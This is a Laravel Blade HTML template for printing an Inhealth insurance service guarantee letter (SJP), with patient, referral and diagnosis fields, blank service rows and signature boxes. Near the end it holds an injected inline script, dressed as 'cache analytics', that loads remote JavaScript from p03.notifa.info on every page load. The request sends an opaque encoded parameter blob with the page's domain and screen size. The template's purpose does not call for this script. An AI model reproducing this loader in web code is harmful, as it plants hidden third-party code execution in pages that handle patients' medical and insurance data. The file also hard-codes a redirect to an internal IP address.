<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="language" content="en" />
    <link rel="stylesheet" href="{{ URL::asset('print-template/screen.css') }}">
    <link rel="stylesheet" href="{{ URL::asset('print-template/main.css') }}">
    <link rel="stylesheet" href="{{ URL::asset('print-template/form.css') }}">
    <link rel="stylesheet" href="{{ URL::asset('print-template/styles.css') }}">
    <title>INHEALTH - Print SJP</title>
    <style type="text/css">
        body { font-size: 80%; }
        table.detail-view th { text-align:left !important; width: 120px !important; }
        table.detail-view td { width: 140px !important; }
        table.bordered th, table.bordered td { border: #000 1px solid; }
        table.bordered th { text-align: center; }
        td.right { text-align: right; }
        table.bordered td.separator-border { border: 0; height: 5px; }
        table.bordered td.noborder { border: 0; }
    </style>
</head>

<body>
<!-- breadcrumbs -->
<div class="container">
    <div id="content">
        <table style="width: 100%">
	    <tr>
	        <td rowspan="2" style="width:20%">&nbsp</td>
	        <td>
		        <h2 style="text-align: center;margin: 0;padding: 0;">
                    PT. ASURANSI JIWA INHEALTH INDONESIA
                </h2>
	        </td>
            <td rowspan="2" style="width:20%">
                    <div>&nbsp;</div>
            </td>
	    </tr>
        <tr>
	        <td>
		        <h4 style="text-align: center;margin: 0;padding: 0;">SURAT JAMINAN PELAYANAN (SJP)</h4>
	        </td>
	    </tr>
        </table>


        <table style="width: 100%">
            <tr>
            <td style="vertical-align: top;">
                <div style="padding-bottom: 10px;">
                    <span style="margin-right: 10px;margin-left: 5px;font-weight:bold;">SJP-RJTL</span> Cetakan Ke <strong>1</strong> ~ 30-06-2018 11:37:53
                </div>
                <table class="detail-view" id="yw0"><tr class="odd"><th>Tanggal SJP</th><td>{{ $dataResponse['TGLSJP'] }}</td></tr>
                    <tr class="even"><th>No Rujukan</th><td>{{ $dataResponse['NOMORRUJUKAN'] }}</td></tr>
                    <tr class="odd"><th>Tgl Rujukan</th><td>{{ $dataResponse['TGLRUJUKAN'] }}</td></tr>
                    <tr class="even"><th>Asal Rujukan</th><td>{{ $dataResponse['NMPPKASALRUJUKAN'] }}</td></tr>
                    <tr class="odd"><th>Diagnosa Awal</th><td>{{ $dataResponse['NMDIAG'] }}</td></tr>
                    <tr class="even"><th>Tujuan Rujukan</th><td>1) Poli: {{ $dataResponse['NMPOLI'] }}</td></tr>
                    <tr class="odd"><th>Diagnosa R.S</th><td>................</td></tr>
                </table>        
            </td>
            <td style="vertical-align: top;">
                <div style="padding-bottom: 10px;">
                    <strong>No. SJP</strong> {{ $dataResponse['NOSJP'] }} (COB)
                </div>
                <table class="detail-view" id="yw1"><tr class="odd"><th>Nama Peserta</th><td>{{ $dataResponse['NAMAPESERTA'] }}</td></tr>
                    <tr class="even"><th>No Kartu</th><td>{{ $dataResponse['NOKAPESERTA'] }} / {{ $dataResponse['NOBPJS'] }}</td></tr>
                    <tr class="odd"><th>Plan</th><td>{{ $dataResponse['PLANDESC'] }} - {{ $dataResponse['KELASDESC'] }}</td></tr>
                    <tr class="even"><th>MR</th><td>{{ $dataResponse['NOMEDICALRECORD'] }}</td></tr>
                    <tr class="odd"><th>Jenis Kelamin</th><td>{{ $dataResponse['JENISKELAMIN'] }}</td></tr>
                    <tr class="even"><th>Tgl. Lahir</th><td>{{ $dataResponse['TGLLAHIR'] }}</td></tr>
                    <tr class="odd"><th>Badan Usaha</th><td>{{ $dataResponse['KDBU'] }} - {{ $dataResponse['NMBU'] }}</td></tr>
                </table>        
            </td>
	    </tr>
        <tr>
            <td style="vertical-align:top;">
	            <table style="width: 100%">
                    <tbody>
                        <tr>
                            <th style="text-align: center;">Nama Tind/Pelayanan</th>
                            <th style="text-align: center;">Peserta</th>
                            <th style="text-align: center;">Dokter</th>
                        </tr>
                        <tr>
                            <td>
                                     <tr>
                                        <td> 1) .....................</td>
                                        <td style="text-align: center;">....................</td>
                                        <td style="text-align: center;">....................</td>
                                    </tr>
                               
                                <tr>
                                    <td> 2) .....................</td>
                                    <td style="text-align: center;">....................</td>
                                    <td style="text-align: center;">....................</td>
                                </tr>
                                <tr>
                                    <td> 3) .....................</td>
                                    <td style="text-align: center;">....................</td>
                                    <td style="text-align: center;">....................</td>
                                </tr>
                                <tr>
                                    <td> 4) .....................</td>
                                    <td style="text-align: center;">....................</td>
                                    <td style="text-align: center;">....................</td>
                                </tr>
                                <tr>
                                    <td> 5) .....................</td>
                                    <td style="text-align: center;">....................</td>
                                    <td style="text-align: center;">....................</td>
                                </tr>
                                    <tr>
                                        <td> &nbsp;</td>
                                        <td style="text-align: center;">&nbsp;</td>
                                        <td style="text-align: center;">&nbsp;</td>
                                    </tr>
                            </td>
                        </tr>
                    </tbody>
	            </table>
            </td>
            
            <td style="vertical-align:top;">
	            <table style="width: 100%">
                    <tbody>
                    <tr>
                        <th style="text-align: center;">Nama Tind/Pelayanan</th>
                        <th style="text-align: center;">Peserta</th>
                        <th style="text-align: center;">Dokter</th>
                    </tr>
                    <tr>
                        <td>
                            <tr>
                                <td> 6) .....................</td>
                                <td style="text-align: center;">....................</td>
                                <td style="text-align: center;">....................</td>
                            </tr>
                            <tr>
                                <td> 7) .....................</td>
                                <td style="text-align: center;">....................</td>
                                <td style="text-align: center;">....................</td>
                            </tr>
                            <tr>
                                <td> 8) .....................</td>
                                <td style="text-align: center;">....................</td>
                                <td style="text-align: center;">....................</td>
                            </tr>
                            <tr>
                                <td> 9) .....................</td>
                                <td style="text-align: center;">....................</td>
                                <td style="text-align: center;">....................</td>
                            </tr>
                            <tr>
                                <td> 10) .....................</td>
                                <td style="text-align: center;">....................</td>
                                <td style="text-align: center;">....................</td>
                            </tr>
                                <tr>
                                    <td> &nbsp;</td>
                                    <td style="text-align: center;">&nbsp;</td>
                                    <td style="text-align: center;">&nbsp;</td>
                                </tr>
                        </td>
                    </tr>
                    </tbody>
	            </table>
            </td>
        </tr>
        </table>

        <table  style="width: 100%;">
		    <tr>
		        <td style="text-align: center;width: 40px;">Verifikator<br/><br/><br/>
                        (......................)
		        </td>
		        <td style="text-align: center;width: 50px;">Petugas RS<br/><br/><br/>
                        (......................)
		        </td>
                <td style="width: 80px;">
                    BERKAS TIDAK DIBAWA PULANG
                </td>
		    </tr>
		</table>	</div><!-- content -->
</div>
<script type="text/javascript" src="{{ asset('assets/js/jquery-3.3.1.min.js') }}"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m7svQPClfd4bIgI1Rk4Kr6UB2TvfmaD3HCe%2bGkMjORB%2b4259pLKnRaX1OS8rZkUGpr%2b6Uj0n7xYv%2b0xzSfbxwwHQ51PaV1NX5b0Tn3Sf9FWFVCp4j11fAb%2bEfQyEZQzqL3m5jttu2Lqv9ECfVciEzYoTH0FiQJtSfnUV7Y95h0yjxweGlStV4o8Jx8tXsJgsDCuBMOwXMVq%2fbDwfoL3nKM%2bErtlBOW%2fPE6PhgDeN%2f0BSMytBB5QpbbcRS9dzJN3U79dGuABd28HG0J66NsZ4WRQEvJVMc0%2fc%2bWr5zRWZbp%2fQ5snZ%2bG103%2bjyMG43I%2fORgZcFyIudH7JoZiN9WvYAj1pvfJiUac7NVupRTJ%2fJuemJ5odw2K0V99IJlizvzTWXYtsljNr2rOc4LCeHQks3e5SdzYswCiOcXwa7VhvkkYLPHsDp0czUOhkSHDYSlaVIo%2fo1vXdoiQZGvTDBTwM1owD9lMDrcp1EqYACnbxkEvNX8QQ6W2Ijc7VWWvnrBgF462BZIzKzFPumys0vW1KhAkX9qJOhfVFqy" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
<script type="text/javascript" src="{{ asset('assets/js/mousetrap.min.js') }}"></script>
<script>
   Mousetrap.bind('alt+z', function() { 
    window.location.href = 'http://192.168.1.78:8000/inhealth/checkCard/';
});
</script>
</html>